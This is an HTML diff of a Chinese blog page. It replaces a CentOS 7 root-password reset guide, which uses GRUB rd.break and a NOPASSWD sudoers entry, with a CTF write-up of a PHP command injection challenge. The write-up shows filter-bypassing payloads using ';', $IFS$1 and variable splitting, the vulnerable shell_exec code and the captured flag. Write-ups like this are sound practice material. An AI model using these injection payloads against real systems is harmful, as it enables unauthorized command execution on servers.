@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>CentOS7重置root密码 | 蹦蹦小圆帽の部落格</title>
+    <title>CTF之PHP命令执行 | 蹦蹦小圆帽の部落格</title>
     <meta name="author" content="蹦蹦小圆帽" />
     <meta name="description" content="这个世界灿烂盛大！" />
     <meta name="keywords" content="blog" />
@@ -163,14 +163,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>CentOS7重置root密码</h1>
+        <h1>CTF之PHP命令执行</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2025/9/28
+            2025/11/20
         </span>
         
         
@@ -182,8 +182,29 @@
             
             <span class="tag">
                 
-                <a href="/tags/Linux/" style="color: #03a9f4">
-                    Linux
+                <a href="/tags/CTF/" style="color: #ff7d73">
+                    CTF
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #03a9f4">
+                    渗透测试
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/PHP/" style="color: #ffa2c4">
+                    PHP
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="color: #00bcd4">
+                    命令执行
                 </a>
             </span>
             
@@ -192,68 +213,102 @@
     </div>
     
     <div class="content" v-pre>
-        <h1>CentOS 7 重置root密码</h1>
-<p>CentOS 7 安装过程中没有设置root密码、没有将新建的用户加入管理员组，导致无法使用su和sudo命令</p>
-<h2 id="解决思路">解决思路</h2>
-<p>进入single user mode设置root密码或将用户加入sudoers里面</p>
-<h2 id="解决步骤">解决步骤</h2>
-<ol>
-<li>
-<p>重启虚拟机，在GRUB引导页面按 <code>E</code> 键，进入编辑模式</p>
-</li>
-<li>
-<p>找到<code>linux</code>行，例如：</p>
-<pre><code>linux16 /vmlinuz-3.10.0-862.e17...
+        <h1>PHP命令执行</h1>
+<h2 id="题目：BUUCTF-Ping-Ping-Ping">题目：BUUCTF Ping Ping Ping</h2>
+<h2 id="解题思路">解题思路</h2>
+<p>打开网页看到</p>
+<pre><code>/?ip=
 </code></pre>
-<p>在这一行的末尾（方向键移动到行尾，建议按<code>END</code>键定位到末尾，有些同学可能不知道行尾的意思</p>
-</li>
-<li>
-<p>添加以下内容（不需要另起一行！！）</p>
-<pre><code>rd.break console=tty0
+<p>可以看到直接GET请求一个IP，尝试</p>
+<pre><code>http://target/?ip=127.1
 </code></pre>
-<p>然后按<code>Ctrl+X</code>启动（进入单用户模式）</p>
-</li>
-<li>
-<p>以rw模式重新挂载/sysroot:</p>
-<pre><code>mount -o rw,remount /sysroot
+<p>返回</p>
+<pre><code>PING 127.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.031 ms
+64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.083 ms
+64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.056 ms
+64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.083 ms
+
+--- 127.1 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max = 0.031/0.063/0.083 ms
 </code></pre>
-</li>
-<li>
-<p>切换到/sysroot：</p>
-<pre><code>chroot /sysroot
+<p>访问</p>
+<pre><code>http://target/?ip=127.1;ls
 </code></pre>
-</li>
-<li>
-<p>标准输入修改root密码</p>
-<pre><code>echo '123456' | passwd --stdin root
+<pre><code>/?ip=
+
+PING 127.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.037 ms
+64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.050 ms
+64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.062 ms
+64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.068 ms
+
+--- 127.1 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max = 0.037/0.054/0.068 ms
+flag.php
+index.php
 </code></pre>
-<p>注意需要selinux处于disabled状态，如果不懂请参考方法2</p>
-</li>
-<li>
-<p>(方法2) 将当前用户添加到sudoers文件：</p>
-<pre><code>EDITOR=vim visudo
+<p>可以看到目录下存在<code>flag.php</code>，傻子都知道肯定不可以直接访问flag.php，尝试使用<code>cat</code>命令查看之，返回</p>
+<pre><code>/?ip= fxck your flag!
 </code></pre>
-<p>找到这一行：（可以通过直接输入<code>/Allow root to run</code>快速搜索）</p>
-<pre><code>root    ALL=(ALL)   ALL
+<p>fuck尼玛！！！fuck you and fuck all of you</p>
+<p>接下来尝试使用通配符<code>*</code>，返回：</p>
+<pre><code>/?ip= 1fxck your symbol!
 </code></pre>
-<p>在下面插入（按<code>i</code>进入插入模式）：</p>
-<pre><code>你的用户名  ALL=(ALL)   NOPASSWD:ALL
+<p>此时才想到先去看一下<code>index.php</code>，访问</p>
+<pre><code>http://target/?ip=127.1;cat$IFS$1index.php
 </code></pre>
-<p>然后按<code>Esc</code>退出插入模式，按住<code>Ctrl</code>连续按两下<code>Z</code>保存退出</p>
-<p>输入<code>exit</code>退出chroot容器</p>
-<p>输入<code>reboot</code>重启</p>
-</li>
-<li>
-<p>(方法2) 修改root密码</p>
-<p>开机后登陆你的用户，打开终端，输入：</p>
-<pre><code>sudo su
+<p>得到<code>index.php</code>内容:</p>
+<pre><code class="language-php">/?ip=
+
+PING 127.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.030 ms
+64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.049 ms
+64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.046 ms
+64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.049 ms
+
+--- 127.1 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max = 0.030/0.043/0.049 ms
+/?ip=
+|\'|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;
+    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);
+    die(&quot;fxck your symbol!&quot;);
+  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;
+    die(&quot;fxck your space!&quot;);
+  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;
+    die(&quot;fxck your bash!&quot;);
+  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;
+    die(&quot;fxck your flag!&quot;);
+  &#125;
+  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
+  echo &quot;
+
+&quot;;
+  print_r($a);
+&#125;
 </code></pre>
-<p>进入root用户，然后输入</p>
-<pre><code>passwd root
+<p>可以看到过滤挺全面哈。</p>
+<p>此时可以考虑定义一个变量<code>a=ag</code>，然后构造payload：</p>
+<pre><code>http://target/?ip=127.1;a=ag;cat$IFS$1fl$a.php
 </code></pre>
-<p>输入你要设置的密码（输入两遍）即可重置root密码</p>
-</li>
-</ol>
+<p>这次它终于不fuck了，在注释中找到flag</p>
+<pre><code class="language-php">&lt;pre&gt;PING 127.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.041 ms
+64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.067 ms
+64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.074 ms
+64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.075 ms
+
+--- 127.1 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max = 0.041/0.064/0.075 ms
+&lt;!--?php
+$flag = &quot;flag&#123;ab6f245f-d55b-4d67-8cfb-ddf937f0bd48&#125;&quot;;
+?--&gt;
+&lt;/pre&gt;
+</code></pre>
 
     </div>
     
